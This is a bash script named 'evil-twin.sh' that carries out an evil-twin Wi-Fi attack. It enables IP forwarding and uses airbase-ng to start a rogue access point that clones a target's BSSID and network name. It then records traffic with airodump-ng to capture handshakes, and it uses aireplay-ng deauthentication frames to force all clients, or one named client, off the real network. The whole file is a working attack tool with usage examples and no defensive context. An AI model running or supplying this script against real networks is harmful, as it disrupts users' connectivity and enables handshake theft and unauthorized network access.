#!/usr/bin/env bash

printf "[+] This is a tool writen by YodaMaster\n"
printf "[+] usage: ./evil-twin.sh bssid essid interface{monitor mode} channel client{optional}\n"

if [[ $# -lt 4 ]]; then
    echo "[+] example: ./evil-twin.sh 00:0b:86:c1:af:35 yodanet wlan0mon 2"
    echo "[+] example: ./evil-twin.sh 00:0b:86:c1:af:35 yodanet wlan0mon 2 06:9c:88:f9:a8:33"
    exit
fi
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
bssid=$1
essid=$2
interface=$3
channel=$4

function setup_ap() {
    gnome-terminal -- airbase-ng -a $1 --essid $2 -Z 4 -c $3 $4
}
function deauth(){
    gnome-terminal -- aireplay-ng -0 10 -a $1 $2
}
function deauth_spec(){
    gnome-terminal -- aireplay-ng -0 10 -a $1 -c $3 $2
}
setup_ap $bssid $essid $channel $interface
gnome-terminal -- airodump-ng --bssid $bssid --channel $channel $interface -w "handshake"
if [[ $# -eq 5 ]]; then
    deauth_spec $bssid $interface $5
else
    deauth $bssid $interface
fi
